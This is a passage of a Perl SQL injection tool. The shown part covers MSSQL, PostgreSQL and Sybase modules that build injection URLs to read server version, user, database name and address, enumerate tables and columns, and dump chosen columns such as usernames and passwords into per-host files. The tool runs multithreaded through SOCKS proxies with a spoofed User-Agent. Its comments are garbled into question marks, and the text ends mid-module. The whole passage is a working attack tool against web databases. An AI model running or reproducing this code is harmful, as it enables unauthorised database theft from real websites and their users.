print "----------------------\n";
## ?????? ?????? ?? ??????? ##
for(0..$thr) {
$trl[$_] = threads->create(\&gets668);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets668 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$i = $num;
if ($ms_convert_in == 0) {
$current = $ms_url . "(select" . $ms_spase . "top" . $ms_spase . "1". $ms_spase . $column_name . $ms_spase . "from" . $ms_spase . $table . $ms_spase . "where" . $ms_spase . $column_name . $ms_spase ."not". $ms_spase ."in". $ms_spase ."(select". $ms_spase ."top". $ms_spase . $i . $ms_spase . $column_name . $ms_spase ."from". $ms_spase . $table . $ms_spase . "order". $ms_spase . "by". $ms_spase . $column_name1 . ")". $ms_spase ."order". $ms_spase ."by". $ms_spase . $column_name1 . ")" . $ms_close;
} else {
$current = $ms_url . "convert(int,(select" . $ms_spase . "top" . $ms_spase . "1". $ms_spase . $column_name . $ms_spase . "from" . $ms_spase . $table . $ms_spase . "where" . $ms_spase . $column_name . $ms_spase ."not". $ms_spase ."in". $ms_spase ."(select". $ms_spase ."top". $ms_spase . $i . $ms_spase . $column_name . $ms_spase ."from". $ms_spase . $table . $ms_spase . "order". $ms_spase . "by". $ms_spase . $column_name1 . ")". $ms_spase ."order". $ms_spase ."by". $ms_spase . $column_name1 . "))" . $ms_close;
}
$content = scan_url();
if ($content =~ m/$ms_pattern_data1/imgs || $content =~ m/$ms_pattern_data2/imgs || $content =~ m/$ms_pattern_data3/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_mssql;
} # end MSSQL
if ($choice == 5) {goto START_global}
}
################################################## ################################################## ##################
## PostgreSQL ##############
if ($choice == 3) {
START_ps:
$host = $host8;
if ($use_socks == 1 && $socks_check == 0 && $https_flag == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
sub char_p($) {
$str1=$_[0];
$aa="";$bb="";
for ($i = 0; $i<length($str1); $i++ ) {
$aa = ord(substr($str1,$i,1));
if ( $i == 0 ) {$bb= "chr(" . $aa . ")";} else { $bb= $bb. "||chr(" . $aa . ")" ;}
}
return "$bb";
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] PostgreSQL inj system information\n";
print " [2] PostgreSQL inj get tables from information_schema\n";
print " [3] PostgreSQL inj get column_name from table\n";
print " [4] PostgreSQL inj get data from columns\n";
print " ================================================== =====\n";
print " [5] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
################################################## ################################################## ################
## UNION+SELECT method ##
if ($p_method == 0) {
if ($p_union_select_url =~ m/^https:\/\/?([^\/]+)/i) {
$host8 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host8;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
print "========================================\n";
print " PostgreSQL UNION+SELECT method\n";
print "========================================\n";
if ($choice == 1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
$url1 = $p_sql_start . $p_sql_pref1 . "cast(version()" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_filtr;
$url2 = $p_sql_start . $p_sql_pref1 . "cast(current_user" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_filtr;
$url3 = $p_sql_start . $p_sql_pref1 . "cast(current_database()" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_filtr;
$url4 = $p_sql_start . $p_sql_pref1 . "cast(inet_server_addr()" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_filtr;
$url5 = $p_sql_start . $p_sql_pref1 . "cast(inet_server_port()" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_filtr;
@array = ($url1,$url2,$url3,$url4,$url5);
$size = @array; #???????? ?????? ???????
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets670);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets670 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
if ($num == 0) {$mess = 'version(): '}
if ($num == 1) {$mess = "current_user: "}
if ($num == 2) {$mess = "current_database(): "}
if ($num == 3) {$mess = "inet_server_addr(): "}
if ($num == 4) {$mess = "inet_server_port(): "}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $mess . $1 . "\n";
print FILE $mess . $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
$current = $p_sql_start . $p_sql_pref1 . "cast(count(*)" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_plus . "from" . $p_plus . "information_schema.tables" . $p_filtr; # ??????? ???-?? ??????
$content = scan_url();
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/imgs;
$tab_num = $1; # ???-?? ???????? ? informaion_schema
print "-----------------------------------------\n";
print "Tables in information_schema.tables - $1\n";
print "-----------------------------------------\n";
## start from2 ##
print "Get ALL tables from information_schema ($1) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????

} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num+1) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE "Tables in information_schema.tables - $1\n";
print FILE "-----------------------------------------\n";
$url12 = $p_sql_start . $p_sql_pref1 . "cast(table_name" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_plus . "from" . $p_plus . "information_schema.tables" . $p_plus . "limit" . $p_plus . "1";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets671);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets671 {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
$current = $url12 . $p_plus . "offset" . $p_plus . $num . $p_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
if ($choice == 3) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$table_name1 = $choice;
$table_name = char_p ($choice);
$current = $p_sql_start . $p_sql_pref1 . "cast(count(*)" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_plus . "from" . $p_plus . "information_schema.columns" . $p_plus . "where" . $p_plus . "table_name=" . $table_name . $p_filtr;
$content = scan_url();
$content =~ m/ussr(.*?)ussr/imgs;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
print "Number of columns in " . $table_name1 . ": $colum_number\n";
print FILE "Number of columns in " . $table_name1 . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$url15 = $p_sql_start . $p_sql_pref1 . "cast(column_name" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_plus . "from" . $p_plus . "information_schema.columns" . $p_plus . "where" . $p_plus . "table_name=" . $table_name . $p_plus . "limit" . $p_plus . "1";
print FILE "Columns in " . $table_name1 . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets672);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets672 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
$current = $url15 . $p_plus . "offset" . $p_plus . $num . $p_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
$table_name = $choice;
print "Table: $table_name\n";
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name1 = $choice;
$column_name = $choice;
@column_spis = split(/,/,$column_name);
$size = @column_spis;
if ($size > 1) {
$column_name = "";
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$column_name .= $column_spis[$a];
} else {
$column_name .= $column_spis[$a] . "||chr(58)||";
}
$a++;
}
}
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name1. " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$current = $p_sql_start . $p_sql_pref1 . "cast(count(*)" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_plus . "from" . $p_plus . $table_name . $p_filtr;
$content = scan_url();
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/imgs;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ?????? ?????? ?? ??????? ##
$url17 = $p_sql_start . $p_sql_pref1 . "cast(" . $column_name . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_sql_pref2 . $p_sql_end . $p_plus . "from" . $p_plus . $table_name . $p_plus . "limit" . $p_plus . "1";
for(0..$thr) {
$trl[$_] = threads->create(\&gets673);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets673 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$current = $url17 . $p_plus . "offset" . $p_plus . $num . $p_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
}
################################################## ################################################## ################

## Subquery method ##
if ($p_method == 1) {
if ($p_subquery_url =~ m/^https:\/\/?([^\/]+)/i) {
$host8 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host8;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
print "========================================\n";
print " PostgreSQL SUBQUERY method\n";
print "========================================\n";
if ($choice == 1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
$url1 = $p_subquery_url . "cast(" . $p_sql_pref1 . "version()" . $p_sql_pref2 . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$url2 = $p_subquery_url . "cast(" . $p_sql_pref1 . "current_user" . $p_sql_pref2 . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$url3 = $p_subquery_url . "cast(" . $p_sql_pref1 . "current_database()" . $p_sql_pref2 . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$url4 = $p_subquery_url . "cast(" . $p_sql_pref1 . "inet_server_addr()" . $p_sql_pref2 . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$url5 = $p_subquery_url . "cast(" . $p_sql_pref1 . "inet_server_port()" . $p_sql_pref2 . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
@array = ($url1,$url2,$url3,$url4,$url5);
$size = @array; #???????? ?????? ???????
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets813);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets813 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
if ($num == 0) {$mess = 'version(): '}
if ($num == 1) {$mess = "current_user: "}
if ($num == 2) {$mess = "current_database(): "}
if ($num == 3) {$mess = "inet_server_addr(): "}
if ($num == 4) {$mess = "inet_server_port(): "}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $mess . $1 . "\n";
print FILE $mess . $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
$current = $p_subquery_url . "cast((select" . $p_plus . $p_sql_pref1 . "count(*)" . $p_sql_pref2 . $p_plus . "from" . $p_plus . "information_schema.tables)" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$content = scan_url();
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/imgs;
$tab_num = $1; # ???-?? ???????? ? informaion_schema
print "-----------------------------------------\n";
print "Tables in information_schema.tables - $1\n";
print "-----------------------------------------\n";
## start from2 ##
print "Get ALL tables from information_schema ($1) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num+1) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE "Tables in information_schema.tables - $1\n";
print FILE "-----------------------------------------\n";
$url12 = $p_subquery_url . "cast((select" . $p_plus . $p_sql_pref1 . "table_name" . $p_sql_pref2 . $p_plus . "from" . $p_plus . "information_schema.tables" . $p_plus . "limit" . $p_plus . "1";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets814);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets814 {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
$current = $url12 . $p_plus . "offset" . $p_plus . $num . ")" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
if ($choice == 3) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$table_name1 = $choice;
$table_name = char_p ($choice);
$current = $p_subquery_url . "cast((select" . $p_plus . $p_sql_pref1 . "count(*)" . $p_sql_pref2 . $p_plus . "from" . $p_plus . "information_schema.columns" . $p_plus . "where" . $p_plus . "table_name=" . $table_name . ")" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$content = scan_url();
$content =~ m/ussr(.*?)ussr/imgs;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
print "Number of columns in " . $table_name1 . ": $colum_number\n";
print FILE "Number of columns in " . $table_name1 . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$url15 = $p_subquery_url . "cast((select" . $p_plus . $p_sql_pref1 . "column_name" . $p_sql_pref2 . $p_plus . "from" . $p_plus . "information_schema.columns" . $p_plus . "where" . $p_plus . "table_name=" . $table_name . $p_plus . "limit" . $p_plus . "1";
print FILE "Columns in " . $table_name1 . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets815);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets815 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
$current = $url15 . $p_plus . "offset" . $p_plus . $num . ")" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
$table_name = $choice;
print "Table: $table_name\n";
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name1 = $choice;
$column_name = $choice;
@column_spis = split(/,/,$column_name);
$size = @column_spis;
if ($size > 1) {
$column_name = "";
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$column_name .= $column_spis[$a];
} else {
$column_name .= $column_spis[$a] . "||chr(58)||";
}
$a++;
}
}
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name1. " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$current = $p_subquery_url . "cast((select" . $p_plus . $p_sql_pref1 . "count(*)" . $p_sql_pref2 . $p_plus . "from" . $p_plus . $table_name . ")" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$content = scan_url();
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/imgs;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ?????? ?????? ?? ??????? ##
$url17 = $p_subquery_url . "cast((select" . $p_plus . $p_sql_pref1 . $column_name . $p_sql_pref2 . $p_plus . "from" . $p_plus . $table_name . $p_plus . "limit" . $p_plus . "1";
for(0..$thr) {
$trl[$_] = threads->create(\&gets816);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets816 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$current = $url17 . $p_plus . "offset" . $p_plus . $num . ")" . $p_plus . "as" . $p_plus . $p_convert . ")" . $p_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_ps;
}
}
#end PosgreSQL
if ($choice == 5) {goto START_global}
}
################################################## ################################################## ##################
##Sybase SQL ##############
if ($choice == 4) {
START_sb:
if ($s_union_select_url =~ m/^https:\/\/?([^\/]+)/i) {
$host9 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
if ($s_subquery_url =~ m/^https:\/\/?([^\/]+)/i) {
$host9 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}

$host = $host9;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] Sybase SQL inj system information\n";
print " [2] Sybase SQL inj get DB names from master..syslogins \n";
print " [3] Sybase SQL inj get tables from DB\n";
print " [4] Sybase SQL inj get column_name from table\n";
print " [5] Sybase SQL inj get data from columns\n";
print " ================================================== =====\n";
print " [6] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice == 1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
if ($s_method == 1) {
$url1 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . '@@version' . $s_sql_pref2 . '))' . $s_filtr;
$url2 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'user_name()' . $s_sql_pref2 . '))' . $s_filtr;
$url3 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . '@@boottime' . $s_sql_pref2 . '))' . $s_filtr;
$url4 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . '@@errorlog' . $s_sql_pref2 . '))' . $s_filtr;

$url5 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . '@@language' . $s_sql_pref2 . '))' . $s_filtr;
$url6 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . '@@servername' . $s_sql_pref2 . '))' . $s_filtr;
$url7 = $s_subquery_url . "convert(" . $s_convert . ",(select" . $s_plus . $s_sql_pref1 . 'db_name()' . $s_sql_pref2 . '))' . $s_filtr;
@array = ($url1,$url2,$url3,$url4,$url5,$url6,$url7);
$size = @array; #???????? ?????? ???????
print "----------------\n";
print "SUBQUERY METHOD\n";
print "----------------\n";
}
if ($s_method == 0) {
$url1 = $ss_sql_start . $s_sql_pref1 . '@@version' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
$url2 = $ss_sql_start . $s_sql_pref1 . 'user_name()' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
$url3 = $ss_sql_start . $s_sql_pref1 . '@@boottime' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
$url4 = $ss_sql_start . $s_sql_pref1 . '@@errorlog' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
$url5 = $ss_sql_start . $s_sql_pref1 . '@@language' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
$url6 = $ss_sql_start . $s_sql_pref1 . '@@servername' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
$url7 = $ss_sql_start . $s_sql_pref1 . 'db_name()' . $s_sql_pref2 . $ss_sql_end . $s_filtr;
@array = ($url1,$url2,$url3,$url4,$url5,$url6,$url7);
$size = @array; #???????? ?????? ???????
print "-------------------\n";
print "UNION SELECT METHOD\n";
print "-------------------\n";
}
print "HOST - $host\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets680);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets680 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
if ($num == 0) {$mess = '@@version: '}
if ($num == 1) {$mess = "user_name(): "}
if ($num == 2) {$mess = '@@boottime: '}
if ($num == 3) {$mess = '@@errorlog: '}
if ($num == 4) {$mess = '@@language: '}
if ($num == 5) {$mess = '@@servername: '}
if ($num == 6) {$mess = 'db_name(): '}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $mess . $1 . "\n";
print FILE $mess . $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_sb;
}
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print FILE "=============================================" . "\n";
print FILE "DB names from master..syslogins:" . "\n";
print FILE "=============================================" . "\n";
print "-----------------------------------------\n";
print "DB names from master..syslogins:\n";
print "Request method - $method\n";
print "Threads - 1 (Sybase)\n";
